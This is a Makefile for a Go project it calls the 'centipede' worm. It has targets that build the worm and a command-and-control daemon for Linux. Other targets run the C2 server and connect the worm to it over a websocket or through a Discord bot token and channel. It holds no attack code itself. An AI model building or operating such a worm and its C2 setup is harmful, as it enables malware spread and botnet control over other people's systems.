.PHONY: all clean build build-worm build-c2d test

BIN_DIR = bin
GO = go

all: build

build: build-worm build-c2d

build-worm:
	@echo "building centipede worm..."
	GOOS=linux GOARCH=amd64 $(GO) build -ldflags="-s -w" -o $(BIN_DIR)/centipede ./cmd/centipede/

build-c2d:
	@echo "building centipede C2 daemon..."
	GOOS=linux GOARCH=amd64 $(GO) build -ldflags="-s -w" -o $(BIN_DIR)/c2d ./cmd/c2d/

build-arm64:
	GOOS=linux GOARCH=arm64 $(GO) build -ldflags="-s -w" -o $(BIN_DIR)/centipede-arm64 ./cmd/centipede/
	GOOS=linux GOARCH=arm64 $(GO) build -ldflags="-s -w" -o $(BIN_DIR)/c2d-arm64 ./cmd/c2d/

clean:
	rm -rf $(BIN_DIR)/

test:
	$(GO) test ./...

deps:
	$(GO) mod tidy
	$(GO) mod verify

run-c2d:
	./bin/c2d -addr :8443

run-c2d-tls:
	./bin/c2d -addr :8443 -cert server.crt -key server.key

run-worm:
	./bin/centipede -c2 ws://127.0.0.1:8443/ws/bot

run-worm-discord:
	./bin/centipede -c2-discord-token "TOKEN" -c2-discord-channel "CHANNEL_ID"
